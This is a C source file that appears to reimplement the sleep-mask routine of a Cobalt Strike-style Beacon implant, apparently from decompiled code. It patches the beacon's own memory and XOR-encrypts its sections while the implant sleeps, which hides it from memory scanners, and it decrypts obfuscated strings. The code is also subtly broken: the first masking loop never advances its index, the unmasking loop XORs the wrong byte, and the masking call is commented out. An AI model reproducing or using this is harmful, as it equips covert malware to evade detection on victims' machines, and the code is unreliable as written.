#include "BeaconSleep.h"
//#include "c2profile.h"
SLEEPMASKP* gBeaconSleepMask;
HINSTANCE GetBeaconBase()
{
    return Beacon_Dllbase;
}

PVOID SleepEncryptlpAddress;
void sub_1000436C()
{
     DWORD flOldProtect;
    if (!SleepEncryptlpAddress)
    {
        int BeaconCode = decryptInt(shark_BeaconCode);
        char* Beaconbase = (char*)GetBeaconBase();
        VirtualProtect(Beaconbase + BeaconCode, (char*)sub_10004325 - (char*)BeaconSleepMask, 4, &flOldProtect);
        SleepEncryptlpAddress = Beaconbase + BeaconCode;
        memcpy(SleepEncryptlpAddress, BeaconSleepMask, (char*)sub_10004325 - (char*)BeaconSleepMask);
        VirtualProtect(SleepEncryptlpAddress, (char*)sub_10004325 - (char*)BeaconSleepMask, flOldProtect, &flOldProtect);
        gBeaconSleepMask = (SLEEPMASKP*)malloc(sizeof(SLEEPMASKP));
        gBeaconSleepMask->BeaconBase = (char*)GetBeaconBase();
        gBeaconSleepMask->sections = (int*) decryptString(shark_sleepsection); //get_str(42)
        random_bytesarray((BYTE*)gBeaconSleepMask->mask, 0xDu);
    }
}
void BeaconSleepMask(SLEEPMASKP* parms, pSleep psleep, int time)
{
    int* index = parms->sections;
    while (true)
    {
        int a = index[0];
        int b = index[1];
        if (!a && !b)
        {
            break;
        }
        for (; a < b; ++a)
        {
            parms->BeaconBase[a] ^= parms->mask[a % 13];
        }
    }
    psleep(time);
    index = parms->sections;
    while (1)
    {
        int a = index[0];
        int b = index[1];
        index += 2;
        if (!a && !b)
        {
            break;
        }
        for (; a < b; ++a)
        {
            parms->BeaconBase[b] ^= parms->mask[b % 13];
        }
    }
}
void sub_10004325()
{
    sub_1000436C();
}

void BeaconSleep(unsigned long dwMilliseconds)
{
    //不是反射dll不用
    if (decryptInt(shark_BeaconCode) && BackgroundThreadsNumber <= 0)
    {
        //sub_10004325();
        //((void(__cdecl*)(SLEEPMASKP*, void(__stdcall*)(DWORD), DWORD))SleepEncryptlpAddress)(gBeaconSleepMask, Sleep, dwMilliseconds);
        Sleep(dwMilliseconds);
    }
    else
    {
        Sleep(dwMilliseconds);
    }
}